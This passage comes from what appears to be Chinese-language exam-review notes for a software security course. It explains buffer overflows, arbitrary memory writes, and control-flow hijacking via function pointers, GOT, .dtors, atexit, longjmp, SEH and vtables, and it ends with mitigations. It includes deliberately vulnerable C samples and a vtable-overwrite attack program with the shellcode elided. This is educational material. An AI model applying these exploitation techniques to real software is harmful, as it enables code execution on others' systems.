class="number">1</span>; <span class="comment">/* data seg, local */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> local_static_uninit; <span class="comment">/* BSS segment, local */</span></span><br><span class="line"><span class="comment">/* storage for buff_ptr is stack, local */</span></span><br><span class="line"><span class="comment">/* allocated memory is heap, local */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>4.<strong>函数指针</strong>举例</p>
<p>考试练习题：什么情况缓冲区溢出？要记一下每行代码作用类似的。（考了n次）</p>
<p><strong>argv[1]的长度大于BUFFSIZE就会发生缓冲区溢出。</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">good_function</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *str)</span> &#123;</span><br><span class="line"><span class="comment">// do something</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (argc != <span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Usage: prog_name &lt;string1&gt;\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">char</span> buff [BUFFSIZE]; <span class="comment">// 存储于BSS段</span></span><br><span class="line"><span class="type">static</span> <span class="title function_">void</span> <span class="params">(*funcPtr)</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *str)</span>; <span class="comment">// 存储于BSS段</span></span><br><span class="line">funcPtr = &amp;good_function;</span><br><span class="line"><span class="built_in">strncpy</span>(buff, argv[<span class="number">1</span>], <span class="built_in">strlen</span>(argv[<span class="number">1</span>])); **<span class="comment">// argv[1]的长度大于BUFFSIZE就会发生缓冲区溢出**</span></span><br><span class="line">(<span class="type">void</span>)(*funcPtr)(argv[<span class="number">2</span>]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>程序存在漏洞可<strong>被缓冲区溢出利用</strong>。<strong>缓冲区和函数指针都未初始化</strong>，因此存在于BSS段。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">good_function</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *str)</span> &#123;...&#125; </span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> &#123;</span><br><span class="line"><span class="type">static</span> <span class="type">char</span> buff[BUFFSIZE]; <span class="comment">// **静态字符数组buff**</span></span><br><span class="line"><span class="type">static</span> <span class="title function_">void</span> <span class="params">(*funcPtr)</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *str)</span>; </span><br><span class="line"><span class="comment">// 当程序执行到**funcPtr标识的函数**的时候，**shellcode将会取代good_function()**得以执行</span></span><br><span class="line">funcPtr = &amp;good_function; <span class="comment">// funcPtr**都是未初始化的**，并且存储于**BSS段**</span></span><br><span class="line"><span class="built_in">strncpy</span>(buff, argv[<span class="number">1</span>], <span class="built_in">strlen</span>(argv[<span class="number">1</span>])); </span><br><span class="line">**<span class="comment">// 当argv[1]的长度大于BUFFSIZE的时候，就会发生缓冲区溢出**</span></span><br><span class="line">(<span class="type">void</span>)(*funcPtr)(argv[<span class="number">2</span>]); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>5.对象指针举例</p>
<p>考试练习题：哪一行会发生任意内存写？（考了n次）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">foo</span><span class="params">(<span class="type">void</span> * arg, <span class="type">size_t</span> len)</span> &#123;</span><br><span class="line"><span class="type">char</span> buff[<span class="number">100</span>]; <span class="comment">// 缓冲区容易**被漏洞利用**</span></span><br><span class="line"><span class="type">long</span> val = …; </span><br><span class="line"><span class="type">long</span> *ptr = …;</span><br><span class="line"><span class="built_in">memcpy</span>(buff, arg, len); </span><br><span class="line">*ptr = val; </span><br><span class="line">…</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>memcpy(buff, arg, len)：<strong>在溢出缓冲区后，攻击者可以覆写ptr和val</strong></li>
<li>*<strong>ptr &#x3D; val：会发生任意内存写</strong></li>
</ul>
<p><strong>6.修改指令指针</strong></p>
<p>（1）IC存储了<strong>将要执行的下一条指令地址</strong>。</p>
<p>（2）IC<strong>不能被直接访问</strong>，在<strong>顺序执行代码时递增</strong>，也可以由<strong>控制转移指令间接修改</strong>。比如jmp、Conditional jumps、call、ret。</p>
<p>（3）静态调用对于函数地址<strong>使用立即数</strong>：指令中地址被编码。<strong>计算地址，然后放入IC。</strong>不改变执行指令，<strong>IC不会改变。</strong></p>
<p>（4）<strong>IC的下一个值，存储在内存中</strong>，其可以被改变。可以通过函数指针调用（间接引用）。通过函数指针，可以间接地调用函数，即不是直接通过函数名来调用。</p>
<p>（5）控制IC使得<strong>攻击者可以选择要执行的代码，</strong>攻击者<strong>能够任意写的话很容易：</strong>借助<strong>指针变量</strong>进行赋值。<strong>间接的函数引用与无法在编译期间决定的函数调用可以被利用，</strong>从而使程序的<strong>控制权转移到任意代码</strong>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> _tmain(<span class="type">int</span> argc, _TCHAR* argv[]) &#123;</span><br><span class="line"><span class="keyword">if</span> (argc !=<span class="number">1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Usage: prog_name\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="title function_">void</span> <span class="params">(*funcPtr)</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *str)</span>;</span><br><span class="line">funcPtr = &amp;good_function;</span><br><span class="line">(<span class="type">void</span>)(*funcPtr)(<span class="string">&quot;hi &quot;</span>); <span class="comment">// 使用指针调用good function</span></span><br><span class="line">good_function(<span class="string">&quot;there!\n&quot;</span>); <span class="comment">// 直接调用good function，不可以被覆写</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上述代码反汇编：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">**(<span class="type">void</span>)(*funcPtr)(<span class="string">&quot;hi&quot;</span>);**</span><br><span class="line"><span class="number">00424178</span> mov esi, esp </span><br><span class="line"><span class="number">0042417</span>A push offset <span class="built_in">string</span> <span class="string">&quot;hi&quot;</span> (<span class="number">46802</span>Ch) </span><br><span class="line"><span class="number">0042417F</span> call dword ptr [funcPtr (<span class="number">478400</span>h)] </span><br><span class="line"><span class="comment">// 第一个调用good function机器码ff 15 **00 84 47 00**最后4个字节包含了**被调用函数的地址**</span></span><br><span class="line"><span class="number">00424185</span> add esp, <span class="number">4</span> </span><br><span class="line"><span class="number">00424188</span> cmp esi, esp</span><br><span class="line"></span><br><span class="line">**<span class="title function_">good_function</span><span class="params">(<span class="string">&quot;there!\n&quot;</span>)</span>;**</span><br><span class="line"><span class="number">0042418F</span> push offset <span class="built_in">string</span> <span class="string">&quot;there!\n&quot;</span> (<span class="number">468020</span>h) </span><br><span class="line"><span class="number">00424194</span> call good_function **(<span class="number">422479</span>h)** </span><br><span class="line"><span class="comment">// 第二个调用good function机器码e8 e0 e2 ff ff最后4字节**被调用函数的相对偏移量**</span></span><br><span class="line"><span class="number">00424199</span> add esp, <span class="number">4</span></span><br></pre></td></tr></table></figure>

<p>问题：存储在0x00478400中的<strong>地址是0x00422479</strong>，该地址表示<strong>good_function函数的入口地址</strong>。</p>
<p>7.修改指令指针的目标：<strong>全局偏移表</strong></p>
<p>（1）ELF默认二进制格式，GOT被包含在<strong>ELF的二进制文件的进程空间里</strong>。<strong>GOT存放绝对地址。</strong></p>
<p>（3）GOT程序首次使用一个函数前，GOT入口项<strong>包含运行时连接器RTL的地址。</strong>如果该函数被程序调用，则程序的<strong>控制权被转移到RTL</strong>，然后函数的<strong>实际地址被确定且被插入到GOT中</strong>，接下来就可以<strong>通过GOT中的入口项直接调用函数。</strong></p>
<p>（4）在ELF可执行文件中的GOT入口项的地址<strong>是固定的。</strong>对任何可执行进程映像而言<strong>GOT入口项都位于相同的地址。</strong>可以利用<strong>objdump命令查看某一个函数的GOT入口项位置。</strong></p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2043.png" alt="image.png"></p>
<p>（5）如何利用GOT：攻击者<strong>需要有自己的shellcode</strong>，攻击者需要<strong>能够向任意地址写入任意值</strong>。攻击者<strong>用自己的shellcode地址覆写GOT地址</strong>（将要被使用的）</p>
<p>8.修改指令指针的目标</p>
<p><strong>（1）.dtors区</strong></p>
<ul>
<li><strong>constructor</strong>属性：函数<strong>在main()之前</strong>被调用</li>
<li><strong>destructor</strong>属性：函数将<strong>在main()执行完成后</strong>进行调用</li>
<li>构造函数和析构函数分别存储于生成的ELF可执行映像的.ctors和.dtors区中</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">create</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">__<span class="title function_">ttribute__</span> <span class="params">((constructor))</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">destroy</span> <span class="params">(<span class="type">void</span>)</span></span><br><span class="line">__<span class="title function_">attribute__</span> <span class="params">((destructor))</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;create: %p.\n&quot;</span>, create);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;destroy: %p.\n&quot;</span>, destroy);</span><br><span class="line"><span class="built_in">exit</span>(EXIT_SUCCESS);&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">create</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;create called.\n&quot;</span>);&#125;</span><br><span class="line"><span class="comment">/* create called. create: 0x80483a0. destroy: 0x80483b8. destroy called. */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">destroy</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;destroy called.\n&quot;</span>);&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>这两个区都有如下的布局形式：0xffffffff {function-address} 0x00000000</li>
<li>.ctors和.dtors区映射到进程地址空间后，<strong>默认属性为可写</strong></li>
<li>漏洞利用程序<strong>从未利用过构造函数</strong>，因为它们<strong>都在main()函数之前执行</strong></li>
<li>攻击者的兴趣<strong>集中在析构函数和.dtors区上</strong></li>
<li>可以<strong>使用objdump命令检查可执行映像中.dtors区</strong>中的内容</li>
<li>攻击者可以通过<strong>覆写.dtors区中的函数指针的地址</strong>从而将<strong>程序控制权转移到任意的代码</strong></li>
<li>如果攻击者能够读取到目标二进制文件，那么通过分析ELF映像，很容易就能确定要覆写的确切位置。即使没有指定任何析构函数，.dtors区仍然存在。在这种情况下.dtors区中只含有头、尾标签而中间没有函数地址、仍然可以通过将尾标签0x00000000覆写未攻击者提供的外壳代码的地址，从而将控制转移过去。如果外壳代码返回，则进程将会继续调用接下来的函数直到遇到尾标签或发现错误为止。</li>
<li>对于攻击者而言，覆写.dtors区的好处在于：<strong>该区总是存在并且会映射到内存中</strong></li>
<li>然而：.dtors仅存在于用GCC编译和链接的程序中。有时候很难找到合适的外壳代码注入点，使得在main()退出后外壳代码仍然能够驻留在内存中</li>
</ul>
<p><strong>（2）atexit()、on_exit()</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> *glob;</span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, glob);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">atexit(test);</span><br><span class="line">glob = <span class="string">&quot;Exiting.\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>atexit()通过<strong>向一个退出时将被调用的已有函数数组中添加指定的函数</strong>完成工作</li>
<li>exit()以后进先出（Last-in, First-out, LIFO）的顺序调用函数</li>
<li>数组被分配为全局性的符号：__atexit in BSD、__exit_funcs in Linux</li>
</ul>
<p>练习题出现了以下例子：</p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2044.png" alt="image.png"></p>
<ul>
<li>在该调试会话中，<strong>在main()中调用atexit()之前设了一个断点</strong>，然后运行程序。</li>
<li>接下来<strong>执行atexit()函数，注册test()函数。</strong>在test()函数注册后，显示了在__exit_funcs位置处的内存。</li>
<li>每一个函数都保存在由4个双字构成的结构中，每一个结构的最后一个双字保存着函数的实际地址。</li>
<li>示例中：<strong>3个函数已经被注册。</strong>_dl_fini()、__libc_csu_fini()、test()。攻击者可以<strong>覆写__exit_funcs结构</strong>。其中test()地址为<strong>0x080483c8.</strong></li>
</ul>
<p><strong>（3）longjmp()</strong></p>
<ul>
<li>用于处理程序的低级子程序中遇到的错误和中断。setjmp()宏<strong>保存调用环境</strong>。longjmp()，siglongjmp()非局部的跳转到保存的栈环境。</li>
<li>longjmp()返回控制权给调用set_jmp()的指针。</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;setjmp.h&gt;</span></span></span><br><span class="line">jmp_buf buf;</span><br><span class="line"><span class="type">void</span> <span class="title function_">g</span><span class="params">(<span class="type">int</span> n)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">h</span><span class="params">(<span class="type">int</span> n)</span>;</span><br><span class="line"><span class="type">int</span> n = <span class="number">6</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">f</span><span class="params">(<span class="type">void</span>)</span>&#123; setjmp(buf); g(n);&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">g</span><span class="params">(<span class="type">int</span> n)</span>&#123; h(n);&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">h</span><span class="params">(<span class="type">int</span> n)</span> &#123; longjmp(buf, <span class="number">2</span>);&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span> <span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">f();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>jmp_buf的Linux实现：注意JB_PC域，这是攻击目标。任意写可以<strong>用缓冲区溢出shellcode的地址覆盖这个字段。</strong></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> __jmp_buf[<span class="number">6</span>];</span><br><span class="line"><span class="meta"># <span class="keyword">define</span> JB_BX 0</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> JB_SI 1</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> JB_DI 2</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> JB_BP 3</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> JB_SP 4</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> JB_PC 5</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> JB_SIZE 24</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> __<span class="title">jmp_buf_tag</span> &#123;</span></span><br><span class="line">__jmp_buf __jmpbuf; </span><br><span class="line"><span class="type">int</span> __mask_was_saved; </span><br><span class="line"><span class="type">__sigset_t</span> __saved_mask; </span><br><span class="line">&#125; jmp_buf[<span class="number">1</span>]</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">longjmp(env, i) </span><br><span class="line">movl i, %eax <span class="comment">/* return i */</span></span><br><span class="line">movl env.__jmpbuf[JB_BP], %ebp <span class="comment">// movl指令恢复BP</span></span><br><span class="line">movl env.__jmpbuf[JB_SP], %esp <span class="comment">// movl指令恢复栈指针</span></span><br><span class="line">jmp (env.__jmpbuf[JB_PC]) <span class="comment">// 将程序控制权转移到保存的PC</span></span><br></pre></td></tr></table></figure>

<p><strong>（4）异常处理</strong></p>
<ul>
<li>异常：函数操作中<strong>发生的意外情况。</strong></li>
<li>三种形式异常处理程序：<strong>向量化异常处理VEH</strong>、<strong>结构化异常处理SEH</strong>、<strong>系统默认异常处理。</strong></li>
</ul>
<p>①SEH：通过try…catch块实现</p>
<ul>
<li>try块中引发的任何异常<strong>都将被匹配的catch块处理</strong></li>
<li>如果catch块无法处理该异常，<strong>那么它将被传回之前的范围块</strong></li>
<li>__finally被调用来<strong>清理由try块说明的任何东西。</strong></li>
</ul>
<p>②栈帧初始化需注意：<strong>异常处理程序地址紧跟在局部变量之后</strong>。如果栈变量发生缓冲区溢出，那么<strong>异常处理程序地址就可以被覆写。</strong></p>
<ul>
<li><strong>攻击者可以覆写异常处理程序地址，替换TEB中的指针。</strong>TEB包含<strong>已注册的异常处理程序列表。</strong>攻击者仿造一个<strong>列表入口</strong>作为攻击代码的一部分，利用<strong>任意内存写技术修改第一个异常处理程序域。</strong></li>
<li>Windows为进程提供了一个<strong>全局异常过滤器和处理程序</strong>，如果之前的异常处理程序都没能处理异常，那么该处理程序就会被调用。</li>
<li>往往为整个进程实现一个未处理异常，使得程序能够<strong>优雅地处理非预期的错误</strong>或者<strong>只是为了调试方便。</strong></li>
<li><strong>未处理异常过滤器函数</strong>利用SetUnhandledExceptionFilter()函数进行设置。</li>
<li>如果攻击者利用<strong>任意内存写技术</strong>覆盖了某特定内存地址，则<strong>未处理异常过滤器</strong>可以被<strong>重定向去执行</strong>任意代码。</li>
</ul>
<p><strong>（5）虚函数</strong></p>
<p>①面向<strong>对象编程</strong>的重要特性，<strong>允许函数调用的动态绑定。</strong></p>
<p>②虚函数是<strong>类成员函数</strong>，用<strong>virtual关键字</strong>声明，可<strong>由派生类中的同名函数重写</strong>，函数调用在运行时解析。</p>
<p>③虚函数实现：<strong>虚函数表VTBL。VTBL是一个函数指针数组，</strong>用于在运行时<strong>派发虚函数调用在每一个对象的头部</strong>，都包含一个<strong>指向VTBL的虚指针VPTR。</strong>VTBL含有<strong>指向虚函数的每一个实现的指针</strong>。</p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2045.png" alt="image.png"></p>
<p>④攻击者可以<strong>覆写VTBL中的函数指针</strong>，<strong>改写VPTR</strong>使其<strong>指向其他任意的VTBL。</strong></p>
<p>⑤攻击者可以通过<strong>任意内存写</strong>或者<strong>利用缓冲区溢出直接写入对象</strong>实现这一操作。</p>
<p>10.缓解措施</p>
<p>（1）<strong>消除允许内存被不正确地覆写的漏洞</strong>。这些错误出现在：<strong>覆写对象指针、常见的动态内存管理错误、字符串格式化漏洞。</strong></p>
<p>（2）<strong>减少目标暴露：</strong>W^X写或执行，只可其一。<strong>降低有漏洞的进程的权限</strong>。内存区域<strong>要么可写要么可执行，但不可同时二者兼备。</strong></p>
<p>（3）<strong>栈探测仪。</strong>能够保护<strong>通过溢出栈缓冲区</strong>来覆写栈指针或者其他保护区域的漏洞利用。<strong>不能保护</strong>包括<strong>栈段</strong>在内的任何位置发生缓冲区溢出。修改的漏洞利用：<strong>变量、对象指针、函数指针。</strong></p>
<p>11.虚函数攻击</p>
<p>（1）背景：多态是<strong>面向对象</strong>的一个重要特性，在C++中这个特性主要靠<strong>对虚函数的动态调用</strong>来实现。</p>
<p>（2）相关理解：</p>
<p>①C++类的成员函数在声明时，若<strong>使用关键字virtual进行修饰</strong>，<strong>则被称为虚函数。</strong></p>
<p>②一个类中可能有<strong>很多个虚函数</strong>。虚函数的入口地址<strong>被统一保存在虚表中</strong>。</p>
<p>③对象在使用虚函数时，<strong>先通过虚表指针找到虚表</strong>，然后<strong>从虚表中取出最终的函数入口地址</strong>进行调用。</p>
<p>④虚表指针保存在<strong>对象的内存空间中</strong>，紧接着虚表指针的是<strong>其他成员变量</strong>。</p>
<p>⑤虚函数只有<strong>通过对象指针的引用</strong>才能显示出其<strong>动态调用</strong>的特性。</p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2046.png" alt="image.png"></p>
<p>虚函数攻击代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span>[] shellcode=<span class="string">&quot;......&quot;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">vf</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">public:</span><br><span class="line"><span class="type">char</span> buf[<span class="number">200</span>];</span><br><span class="line">virtual <span class="type">void</span> <span class="title function_">test</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;Class Vtable::test()&quot;</span>&lt;&lt;<span class="built_in">endl</span>;&#125;</span><br><span class="line">&#125;;</span><br><span class="line">vf overflow, *p;</span><br><span class="line"><span class="comment">// 这段程序声明了一个类，**具有buf和虚函数test**，声明它的实例overflow和指针p。</span></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">LoadLibrary(<span class="string">&quot;user32.dll&quot;</span>);</span><br><span class="line"><span class="type">char</span> * p_vtable;</span><br><span class="line">p_vtable = overflow.buf<span class="number">-4</span>;<span class="comment">// point to virtual table</span></span><br><span class="line">__asm <span class="type">int</span> <span class="number">3</span></span><br><span class="line"><span class="comment">// reset fake virtual table to 0x0042E430</span></span><br><span class="line"><span class="comment">// the address may need to adjusted via runtime debug</span></span><br><span class="line">p_vtable[<span class="number">0</span>]=<span class="number">0x30</span>;</span><br><span class="line">p_vtable[<span class="number">1</span>]=<span class="number">0xE4</span>;</span><br><span class="line">p_vtable[<span class="number">2</span>]=<span class="number">0x42</span>;</span><br><span class="line">p_vtable[<span class="number">3</span>]=<span class="number">0x00</span>;</span><br><span class="line"><span class="built_in">strcpy</span>(overflow.buf,shellcode1);<span class="comment">// set fake virtual function pointer</span></span><br><span class="line">p=&amp;overflow;</span><br><span class="line">p-&gt;test();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>（3）流程：</p>
<p>①虚表指针<strong>位于成员变量char buf[200]之前</strong>，程序中通过p_vtable &#x3D; overflow.buf-4定位到这个指针。</p>
<p>②<strong>修改虚表指针</strong>指向缓冲区的<strong>0x0042E430处</strong>（第一次得不到，需要通过调试得到）。</p>
<p>③程序执行到<strong>p-&gt;test()<strong>时，将按照</strong>伪造的虚函数指针</strong>去0x0042E430寻找虚表，这里正好是缓冲区里<strong>shellcode的末尾</strong>。在这里填上shellcode的起始位置0x0042E35C作为<strong>伪造的虚函数入口地址</strong>，程序将最终跳去<strong>执行shellcode。</strong></p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2047.png" alt="image.png"></p>
<p>（4）由于虚表指针<strong>位于成员变量之前</strong>，<strong>溢出只能向后覆盖数据</strong>，所以很可惜这种利用方式在栈溢出场景下有一定局限性。当然，如果内存中<strong>存在多个对象且能够溢出到下一个对象空间中去</strong>，连续性覆盖还是有攻击的机会的，比如下图这种情况。</p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2048.png" alt="image.png"></p>
<h3 id="信安补充解释内容"><a href="#信安补充解释内容" class="headerlink" title="信安补充解释内容"></a>信安补充解释内容</h3><p>1.SEH相关知识：SEH即<strong>异常处理结构体</strong>，它是Windows异常处理机制所采用的重要数据结构。每个H包含两个DWORD指针：<strong>SEH链表指针和异常处理函数句柄</strong>，共8个字节。</p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2049.png" alt="image.png"></p>
